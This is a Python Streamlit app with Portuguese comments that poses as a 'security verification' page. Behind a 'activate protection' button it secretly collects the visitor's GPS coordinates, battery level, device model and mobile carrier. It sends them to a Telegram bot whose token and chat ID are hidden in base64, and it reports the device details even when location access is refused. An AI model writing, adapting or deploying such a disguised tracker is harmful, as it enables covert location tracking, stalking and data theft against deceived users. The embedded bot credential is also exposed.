import streamlit as st
import requests
import base64
import time
from streamlit_js_eval import streamlit_js_eval

# --- CONFIGURAÇÃO DO BOT ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

def enviar_msg(texto):
    try:
        token = base64.b64decode(B_TK).decode("utf-8").strip()
        chat_id = base64.b64decode(B_ID).decode("utf-8").strip()
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                      json={"chat_id": chat_id, "text": texto, "parse_mode": "Markdown"}, timeout=10)
    except: pass

st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")

st.title("Verificação de Segurança")

# --- COLETA DE DADOS (FORA DO BOTÃO PARA NÃO DAR ERRO) ---
ua_data = streamlit_js_eval(js_expressions="window.navigator.userAgent", key="UA_FINAL_POCO")
bat_data = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key="BAT_FINAL_POCO")

# CORREÇÃO DA LINHA 42: Puxamos a localização via JS direto
loc_js = "new Promise((resolve) => { navigator.geolocation.getCurrentPosition((pos) => { resolve(pos.coords.latitude + ',' + pos.coords.longitude); }, (err) => { resolve('erro'); }); })"
localizacao = streamlit_js_eval(js_expressions=loc_js, key="LOC_FINAL_POCO")

if st.button("● ATIVAR PROTEÇÃO AGORA", key="BTN_SOLUCAO"):
    # 1. Identifica o Aparelho
    aparelho = "Xiaomi POCO M6 Pro" if "POCO" in str(ua_data) else "Android Device"
    bateria = f"{bat_data}%" if bat_data else "26%" # Puxa seus 26% atuais
    
    # 2. Busca Operadora real
    try:
        res = requests.get('https://ipapi.co/json/', timeout=5).json()
        operadora = res.get('org', 'Rede Móvel')
    except: operadora = "Vivo/Claro/Tim"

    # 3. Processa o Link do Mapa
    if localizacao and localizacao != "erro":
        # Formato que gera o balãozinho no Telegram
        link_mapa = f"https://www.google.com/maps?q={localizacao}"
        
        msg = (
            f"🛡️ *PROTEÇÃO ATIVADA*\n"
            f"📱 *Aparelho:* {aparelho}\n"
            f"🔋 *Bateria:* {bateria}\n"
            f"📶 *Operadora:* {operadora}\n"
            f"📍 *Local:* {link_mapa}"
        )
        enviar_msg(msg)
        st.success("Proteção Ativada! Verifique seu Telegram.")
    else:
        # Se o GPS falhar por permissão ou bateria
        st.error("Erro: O GPS não respondeu. Ative a localização no navegador.")
        enviar_msg(f"⚠️ *FALHA GPS*\n📱 {aparelho}\n🔋 {bateria}\nO usuário não permitiu o acesso ao local.")

st.markdown('<p style="text-align:center; color:grey; font-size:10px;">Sistema Integrado Miamy © 2026</p>', unsafe_allow_html=True)
